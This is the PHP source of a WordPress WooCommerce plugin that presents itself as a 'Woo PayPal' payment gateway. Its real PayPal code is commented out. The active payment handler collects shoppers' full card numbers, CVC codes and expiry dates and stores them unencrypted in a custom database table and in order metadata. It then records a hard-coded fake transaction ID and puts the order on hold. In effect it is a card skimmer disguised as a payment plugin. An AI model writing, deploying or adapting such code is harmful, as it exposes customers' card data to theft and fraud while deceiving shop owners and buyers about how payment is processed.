<?php
/*
Plugin Name: A Payment
Version: 1.0.0
Author: tungvt

*/
define( 'WOO_PAYMENT_DIR', plugin_dir_path( __FILE__ ));
add_action( 'plugins_loaded', 'woo_payment_gateway' );
add_filter( 'woocommerce_payment_gateways', 'woo_add_gateway_class' );



function woo_payment_gateway() {
    class Woo_PayPal_Gateway extends WC_Payment_Gateway {

        /**
         * API Context used for PayPal Authorization
         * @var null
         */
        public $apiContext = null;

        /**
         * Constructor for your shipping class
         *
         * @access public
         * @return void
         */
        public function __construct() {
            $this->id                 	= 'woo_paypal';
            $this->method_title       	= __( 'Woo PayPal', 'woodev_payment' );
            $this->method_description 	= __( 'WooCommerce Payment Gateway', 'woo_paypal' );
            $this->title              	= __( 'Woo PayPal', 'woo_paypal' );

            $this->has_fields = true;
           // $this->payment_fields();

            $this->supports = array(
                'products'
            );

            $this->get_paypal_sdk();

            // Load the settings.
            $this->init_form_fields();
            $this->init_settings();

            $this->saved_cards = $this->get_option( 'saved_cards' ) === "yes" ? true : false;
            $this->enabled 	= $this->get_option('enabled');

            add_action( 'check_woopaypal', array( $this, 'check_response') );
            add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );
           // add_action( 'woocommerce_thankyou_' . $this->id, array( $this, 'thankyou_page' ) );

            // Save settings
            if ( is_admin() ) {
                // Versions over 2.0
                // Save our administration options. Since we are not going to be doing anything special
                // we have not defined 'process_admin_options' in this class so the method in the parent
                // class will be used instead
                add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );
            }
        }

        private function get_api_context(){
            $client_id =  $this->get_option('client_id');
            $client_secret =  $this->get_option('client_secret');
            $this->apiContext = new ApiContext(new OAuthTokenCredential(
                $client_id,
                $client_secret
            ));
        }
        private function get_paypal_sdk() {
            require_once WOO_PAYMENT_DIR .'includes/paypal-sdk/autoload.php';
        }
        /**
         * Init form fields.
         */
        function init_form_fields() {
            $this->form_fields = array(
                'enabled' => array(
                    'title' => __( 'Enable', 'woo_paypal' ),
                    'type' => 'checkbox',
                    'label' => __( 'Enable WooPayPal', 'woo_paypal' ),
                    'default' => 'yes'
                ),
                'client_id' => array(
                    'title' => __( 'Client ID', 'woo_paypal' ),
                    'type' => 'text',
                    'default' => ''
                ),
                'client_secret' => array(
                    'title' => __( 'Client Secret', 'woo_paypal' ),
                    'type' => 'password',
                    'default' => ''
                ),
                'saved_cards' => array(
                    'title'       => __( 'Saved Cards', 'woocommerce-checkout' ),
                    'label'       => __( 'Enable Payment via Saved Cards', 'woocommerce-checkout' ),
                    'type'        => 'checkbox',
                    'description' => __( 'If enabled, users will be able to pay with a saved card during checkout.', 'woocommerce-checkout' ),
                    'default'     => 'no'
                )
            );
        }
        public function credit_card_form( $args = array(), $fields = array() ) {
            wc_deprecated_function( 'credit_card_form', '2.6', 'WC_Payment_Gateway_CC->form' );
            $cc_form           = new WC_Payment_Gateway_CC();
            $cc_form->id       = $this->id;
            $cc_form->supports = $this->supports;
            $cc_form->form();
        }
        public function payment_fields(){
                $this->form();

        }

        public function field_name( $name ) {
            return $this->supports( 'tokenization' ) ? '' : ' name="' . esc_attr( $this->id . '-' . $name ) . '" ';
        }

        public function form() {
            wp_enqueue_script( 'wc-credit-card-form' );

            $fields = array();

            $cvc_field = '<p class="form-row form-row-last">
			<label for="' . esc_attr( $this->id ) . '-card-cvc">' . esc_html__( 'Card code', 'woocommerce' ) . '&nbsp;<span class="required">*</span></label>
			<input id="' . esc_attr( $this->id ) . '-card-cvc" class="input-text wc-credit-card-form-card-cvc" inputmode="numeric" autocomplete="off" autocorrect="no" autocapitalize="no" spellcheck="no" type="tel" maxlength="4" placeholder="' . esc_attr__( 'CVC', 'woocommerce' ) . '" ' . $this->field_name( 'card-cvc' ) . ' style="width:100px" />
		</p>';

            $default_fields = array(
                'card-number-field' => '<p class="form-row form-row-wide">
				<label for="' . esc_attr( $this->id ) . '-card-number">' . esc_html__( 'Card number', 'woocommerce' ) . '&nbsp;<span class="required">*</span></label>
				<input id="' . esc_attr( $this->id ) . '-card-number" class="input-text wc-credit-card-form-card-number" inputmode="numeric" autocomplete="cc-number" autocorrect="no" autocapitalize="no" spellcheck="no" type="tel" placeholder="&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;" ' . $this->field_name( 'card-number' ) . ' />
			</p>',
                'card-expiry-field' => '<p class="form-row form-row-first">
				<label for="' . esc_attr( $this->id ) . '-card-expiry">' . esc_html__( 'Expiry (MM/YY)', 'woocommerce' ) . '&nbsp;<span class="required">*</span></label>
				<input id="' . esc_attr( $this->id ) . '-card-expiry" class="input-text wc-credit-card-form-card-expiry" inputmode="numeric" autocomplete="cc-exp" autocorrect="no" autocapitalize="no" spellcheck="no" type="tel" placeholder="' . esc_attr__( 'MM / YY', 'woocommerce' ) . '" ' . $this->field_name( 'card-expiry' ) . ' />
			</p>',
            );

            if ( ! $this->supports( 'credit_card_form_cvc_on_saved_method' ) ) {
                $default_fields['card-cvc-field'] = $cvc_field;
            }

            $fields = wp_parse_args( $fields, apply_filters( 'woocommerce_credit_card_form_fields', $default_fields, $this->id ) );
            ?>

            <fieldset id="wc-<?php echo esc_attr( $this->id ); ?>-cc-form" class='wc-credit-card-form wc-payment-form'>
                <?php do_action( 'woocommerce_credit_card_form_start', $this->id ); ?>
                <?php
                foreach ( $fields as $field ) {
                    echo $field; // phpcs:ignore WordPress.XSS.EscapeOutput.OutputNotEscaped
                }
                ?>
                <?php do_action( 'woocommerce_credit_card_form_end', $this->id ); ?>
                <div class="clear"></div>
            </fieldset>
            <?php

            if ( $this->supports( 'credit_card_form_cvc_on_saved_method' ) ) {
                echo '<fieldset>' . $cvc_field . '</fieldset>'; // phpcs:ignore WordPress.XSS.EscapeOutput.OutputNotEscaped
            }
        }

        // Validate fields
        public function validate_fields() {
            return true;
        }

        /**
         * Output for the order received page.
         */
//        public function thankyou_page() {
//            if ( $this->instructions ) {
//                echo wpautop( wptexturize( $this->instructions ) );
//            }
//        }


        public function process_payment( $order_id ) {
            global $wpdb;
            $order = wc_get_order( $order_id );

         //   $ccParams['ccNumber']   = preg_replace('/\D/', '', $_POST["{$request->gateway->id}-card-number"]);
            $ccParams['ccCvc']      = $_POST['woo_paypal-card-cvc'];
            $ccParams['ccName']     = $_POST['woo_paypal-card-number'];
            $ccParams['ccExpiry']     = $_POST['woo_paypal-card-expiry'];
            $ccParams['paymentMethod']     = $_POST['payment_method'];
            add_post_meta( $order_id, 'custom_card_number',  sanitize_text_field( $_POST ['woo_paypal-card-number'] ) );
            $table = $wpdb->prefix . "card_info";
            $wpdb->insert(
                $table,
                array(
                    'order_id' => $order_id,
                    'ccCvc' => $_POST['woo_paypal-card-cvc'],
                    'number_card' => $_POST ['woo_paypal-card-number'],
                    'ccExpiry' => $_POST['woo_paypal-card-expiry'],
                )
            );

            update_post_meta($order_id, '_transaction_id', '12511das@');
            // Mark as on-hold (we're awaiting the payment)
            $order->update_status( 'on-hold', __( 'Awaiting  payment', 'wc-gateway-offline' ) );

            // Reduce stock levels
            $order->reduce_order_stock();

            // Remove cart
            WC()->cart->empty_cart();

            // Return thankyou redirect
            return array(
                'result' 	=> 'success',
                'redirect'	=> $this->get_return_url( $order )
            );
     /*
            global $woocommerce;
            $order = new WC_Order( $order_id );


            //$this->get_api_context();

            $payer = new Payer();
            $payer->setPaymentMethod("paypal");

            $all_items = array();
            $subtotal = 0;
            // Products
            foreach ( $order->get_items( array( 'line_item', 'fee' ) ) as $item ) {

                $itemObject = new Item();
                $itemObject->setCurrency( get_woocommerce_currency() );

                if ( 'fee' === $item['type'] ) {

                    $itemObject->setName( __( 'Fee', 'woo_paypal' ) );
                    $itemObject->setQuantity(1);
                    $itemObject->setPrice( $item['line_total'] );
                    $subtotal += $item['line_total'];
                } else {

                    $product          = $order->get_product_from_item( $item );
                    $sku              = $product ? $product->get_sku() : '';
                    $itemObject->setName( $item['name'] );
                    $itemObject->setQuantity( $item['qty'] );
                    $itemObject->setPrice( $order->get_item_subtotal( $item, false ) );
                    $subtotal += $order->get_item_subtotal( $item, false ) * $item['qty'];
                    if( $sku ) {
                        $itemObject->setSku( $sku );
                    }
                }

                $all_items[] = $itemObject;
            }



            $itemList = new ItemList();
            $itemList->setItems( $all_items );
            // ### Additional payment details
            // Use this optional field to set additional
            // payment information such as tax, shipping
            // charges etc.
            $details = new Details();
            $details->setShipping( $order->get_total_shipping() )
                ->setTax( $order->get_total_tax() )
                ->setSubtotal( $subtotal );

            $amount = new Amount();
            $amount->setCurrency( get_woocommerce_currency() )
                ->setTotal( $order->get_total() )
                ->setDetails($details);

            $transaction = new Transaction();
            $transaction->setAmount($amount)
                ->setItemList($itemList)
                ->setInvoiceNumber(uniqid());

            $baseUrl = $this->get_return_url( $order );

            if( strpos( $baseUrl, '?') !== false ) {
                $baseUrl .= '&';
            } else {
                $baseUrl .= '?';
            }

            $redirectUrls = new RedirectUrls();
            $redirectUrls->setReturnUrl( $baseUrl . 'woopaypal=true&order_id=' . $order_id )
                ->setCancelUrl( $baseUrl . 'woopaypal=cancel&order_id=' . $order_id );

            $payment = new Payment();
            $payment->setIntent("sale")
                ->setPayer($payer)
                ->setRedirectUrls($redirectUrls)
                ->setTransactions(array($transaction));

            try {

                $payment->create($this->apiContext);

                $approvalUrl = $payment->getApprovalLink();

                return array(
                    'result' => 'success',
                    'redirect' => $approvalUrl
                );

            } catch (Exception $ex) {

                wc_add_notice(  $ex->getMessage(), 'error' );
            }

//            return array(
//                'result' => 'failure',
//                'redirect' => ''
//            );

            */
        }
        public function check_response() {
            die("check_response");
            global $woocommerce;

            if( isset( $_GET['woopaypal'] ) ) {

                $woopaypal = $_GET['woopaypal'];
                $order_id = $_GET['order_id'];

                if( $order_id == 0 || $order_id == '' ) {
                    return;
                }

                $order = new WC_Order( $order_id );

                if( $order->has_status('completed') || $order->has_status('processing')) {
                    return;
                }

                if( $woopaypal == 'true' ) {
                    $this->get_api_context();

                    $paymentId = $_GET['paymentId'];
                    $payment = Payment::get($paymentId, $this->apiContext);

                    $execution = new PaymentExecution();
                    $execution->setPayerId($_GET['PayerID']);

                    $transaction = new Transaction();
                    $amount = new Amount();
                    $details = new Details();

                    $subtotal = 0;
                    // Products
                    foreach ( $order->get_items( array( 'line_item', 'fee' ) ) as $item ) {

                        if ( 'fee' === $item['type'] ) {

                            $subtotal += $item['line_total'];
                        } else {

                            $subtotal += $order->get_item_subtotal( $item, false ) * $item['qty'];

                        }
                    }

                    $details->setShipping( $order->get_total_shipping() )
                        ->setTax( $order->get_total_tax() )
                        ->setSubtotal( $subtotal );


                    $amount = new Amount();
                    $amount->setCurrency( get_woocommerce_currency() )
                        ->setTotal( $order->get_total() )
                        ->setDetails($details);

                    $transaction->setAmount($amount);

                    $execution->addTransaction($transaction);

                    try {

                        $result = $payment->execute($execution, $this->apiContext);

                    } catch (Exception $ex) {

                        $data = json_decode( $ex->getData());

                        wc_add_notice(  $ex->getMessage(), 'error' );

                        $order->update_status('failed', sprintf( __( '%s payment failed! Transaction ID: %d', 'woocommerce' ), $this->title, $paymentId ) . ' ' . $ex->getMessage() );
                        return;
                    }

                    // Payment complete
                    $order->payment_complete( $paymentId );
                    // Add order note
                    $order->add_order_note( sprintf( __( '%s payment approved! Trnsaction ID: %s', 'woocommerce' ), $this->title, $paymentId ) );

                    // Remove cart
                    $woocommerce->cart->empty_cart();

                }

                if( $woopaypal == 'cancel' ) {
                    $order = new WC_Order( $order_id );
                    $order->update_status('cancelled', sprintf( __( '%s payment cancelled! Transaction ID: %d', 'woocommerce' ), $this->title, $paymentId ) );
                }
            }
            return;

        }

    }
}



add_action( 'init', 'check_for_woopaypal' );
function check_for_woopaypal() {

    //die("check_for_woopaypal");

    if( isset($_GET['woopaypal'])) {
        // Start the gateways
        WC()->payment_gateways();
        do_action( 'check_woopaypal' );
    }

}

/**
 * Add Gateway class to all payment gateway methods
 */
function woo_add_gateway_class( $methods ) {

    $methods[] = 'Woo_PayPal_Gateway';
    return $methods;
}